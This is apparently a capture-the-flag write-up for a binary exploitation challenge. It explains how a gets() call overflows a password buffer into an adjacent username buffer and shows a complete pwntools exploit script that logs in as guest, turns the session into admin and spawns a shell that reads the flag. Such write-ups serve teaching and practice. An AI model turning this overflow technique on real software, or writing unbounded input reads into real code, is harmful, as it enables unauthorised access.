# Secure Email System v1.337 – CTF Writeup

**Category:** Pwn / Binary Exploitation  
**Difficulty:** Easy–Medium  

---

## Challenge Summary

We’re given a Linux ELF binary `email_server`.  
It implements a fake email system with two hardcoded logins:

```c
const char* logins[][2] = {
    {"admin", "🇦🇩🇲🇮🇳"},
    {"guest", "guest"},
};
```

The `admin` account opens a shell, but login is “disabled”:

```c
if (strcmp(username, "admin") == 0) {
    printf("-> Admin login is disabled. Access denied.\n");
    exit(0);
}
```

The `guest` account just prints a fake email and exits.  
Passwords are compared using `strcmp(password, logins[i][1])`.

---

## Vulnerability Analysis

The relevant code:

```c
char password[32];
char username[32];

gets(password);
```

- `gets()` reads input into `password` **without bounds checking**.
- If we input more than 32 bytes, we overwrite `username`.
- The program checks for `"admin"` **before** reading the password.
- But after reading the password, it compares `username` again before calling `open_admin_session()`.

**Key idea:**
1. Start as `"guest"` so we pass the first check.
2. Overflow `password` to overwrite `username` with `"admin"`.
3. Set `password` to match the admin’s real password.

---

## Finding the Overflow Offset

We used pwntools’ `cyclic` pattern to find how many bytes from the start of `password` until `username` begins.

```python
from pwn import *
print(cyclic(64))
```

Run:

```bash
( printf "guest\n"; python3 pattern.py; echo; ) | ./email_server
```

Then find the offset:

```python
from pwn import *
print(cyclic_find('iaaa'))
```

Result: **32 bytes**.

---

## Extracting the Admin Password

We dumped the UTF-8 bytes from the binary using `gdb`:

```bash
nm -C ./email_server | grep logins
# logins is at 0x4020
```

```gdb
x/4gx 0x4020
# Second pointer (0x2447) is the admin password
x/32bx 0x2447
```

We get:

```
0xf0 0x9f 0x87 0xa6 0xf0 0x9f 0x87 0xa9
0xf0 0x9f 0x87 0xb2 0xf0 0x9f 0x87 0xae
0xf0 0x9f 0x87 0xb3 0x00 ...
```

This is `"🇦🇩🇲🇮🇳"`.

---

## Exploit

We craft:

```
[ password bytes + '\x00' + padding up to 32 bytes ]
[ "admin\x00" ]
```

This ensures:
- `password` matches the admin password.
- `username` becomes `"admin"` after overflow.

```python
#!/usr/bin/env python3
from pwn import *

# Local: p = process('./email_server')
p = remote("challenge.host", 31337)

K = 32
admin_pass = bytes([
    0xf0,0x9f,0x87,0xa6,
    0xf0,0x9f,0x87,0xa9,
    0xf0,0x9f,0x87,0xb2,
    0xf0,0x9f,0x87,0xae,
    0xf0,0x9f,0x87,0xb3
])

payload = bytearray()
payload += admin_pass
payload += b'\x00'
payload += b'A' * (K - len(payload))
payload += b'admin\x00'

p.recvuntil(b"Enter your username: ")
p.sendline(b"guest")
p.recvuntil(b"Enter your password: ")
p.send(payload + b'\n')

p.interactive()
```

---

## Output

```
[+] Opening connection to challenge.host on port 31337: Done
-> Password correct. Access granted.
-> Admin login successful. Opening shell...
$ whoami
$ cat /flag.txt
DUCTF{...flag_here...}
```

---
